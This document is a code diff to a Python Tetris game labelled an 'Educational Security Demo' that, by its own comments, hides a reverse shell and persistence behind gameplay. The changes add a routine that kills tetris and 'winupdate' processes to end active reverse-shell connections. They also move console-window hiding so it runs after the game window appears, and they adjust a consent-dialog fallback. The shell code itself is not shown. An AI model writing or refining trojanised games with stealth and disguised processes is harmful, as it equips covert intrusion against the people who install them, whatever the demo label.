@@ -102,7 +102,7 @@ def show_security_warning():
                 sys.exit(0)
             else:
                 print("Please enter 'yes' or 'no'")
-    except EOFError:
+    except (EOFError, RuntimeError, OSError):
         # No console available (GUI mode), use GUI dialog
         print("[*] GUI mode detected, showing GUI consent dialog...")
         if not show_security_warning_gui():
@@ -509,12 +509,81 @@ X-GNOME-Autostart-enabled=true
         print(f"[!] Failed to install persistence: {e}")
         return False
 
+def kill_running_processes():
+    """Kill any running tetris processes to stop active reverse shell connections."""
+    print("[*] Stopping running tetris processes...")
+    killed = False
+    current_pid = os.getpid()  # Get current process PID
+    
+    try:
+        if IS_WINDOWS:
+            # Kill by process name on Windows
+            import subprocess
+            flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+            
+            # Kill python processes running tetris-game.py
+            subprocess.run('taskkill /F /IM python.exe /FI "WINDOWTITLE eq *tetris*" 2>nul', 
+                          shell=True, creationflags=flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run('taskkill /F /IM pythonw.exe /FI "WINDOWTITLE eq *tetris*" 2>nul', 
+                          shell=True, creationflags=flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            # Kill any process with tetris in the command line (except current)
+            try:
+                result = subprocess.run(['wmic', 'process', 'where', f'CommandLine like "%tetris%" AND ProcessId!={current_pid}', 'get', 'ProcessId'],
+                                       capture_output=True, text=True, timeout=10)
+                for line in result.stdout.strip().split('\n')[1:]:  # Skip header
+                    pid = line.strip()
+                    if pid and pid.isdigit() and int(pid) != current_pid:
+                        subprocess.run(['taskkill', '/F', '/PID', pid], 
+                                      capture_output=True, creationflags=flags)
+                        killed = True
+            except:
+                pass
+                
+        else:  # Linux/Mac
+            # Use pkill to kill processes matching tetris patterns
+            import subprocess
+            
+            # Kill processes by name pattern (exclude current PID)
+            patterns = ['tetris-game.py', 'tetris-game', 'winupdate.py', 'winupdate']
+            for pattern in patterns:
+                try:
+                    # Get PIDs matching pattern
+                    result = subprocess.run(['pgrep', '-f', pattern], 
+                                           capture_output=True, text=True, timeout=5)
+                    if result.stdout:
+                        for pid in result.stdout.strip().split('\n'):
+                            try:
+                                pid_int = int(pid.strip())
+                                if pid_int != current_pid:  # Don't kill ourselves
+                                    os.kill(pid_int, 9)
+                                    killed = True
+                            except:
+                                pass
+                except:
+                    pass
+        
+        if killed:
+            print("[+] Running tetris processes killed")
+        else:
+            print("[*] No running tetris processes found")
+            
+        return killed
+        
+    except Exception as e:
+        print(f"[!] Error killing processes: {e}")
+        return False
+
+
 def remove_persistence():
     """
-    Remove all persistence mechanisms.
+    Remove all persistence mechanisms and kill running processes.
     This is called by the cleanup tool.
     """
     print("[*] Removing persistence mechanisms...")
+    
+    # First kill any running tetris processes
+    kill_running_processes()
     
     try:
         script_path = get_script_path()
@@ -1653,6 +1722,12 @@ def run_game():
     pygame.init()
     screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
     pygame.display.set_caption("Tetris - Educational Security Demo")
+    
+    # Hide console window after game window is created (Windows only)
+    # This ensures the game window is visible before hiding the console
+    if IS_WINDOWS:
+        hide_console_window()
+    
     clock = pygame.time.Clock()
     
     game = TetrisGame()
@@ -1848,9 +1923,6 @@ def main():
     
     # === ACTIVATE STEALTH FEATURES ===
     if IS_WINDOWS:
-        # Hide console window immediately
-        hide_console_window()
-        
         # Enforce singleton - prevent multiple instances
         enforce_singleton()
         
